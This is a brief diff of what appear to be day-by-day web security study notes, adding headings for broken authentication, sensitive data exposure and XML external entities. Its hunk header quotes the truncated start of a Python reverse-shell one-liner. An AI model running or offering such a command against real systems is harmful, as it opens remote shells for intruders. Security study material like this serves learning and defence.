@@ -7,3 +7,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 
 ## Day 2 : Broken Authentication
+
+## Day 3 : Sensitive data exposure
+
+## Day 4 : XML External Entity
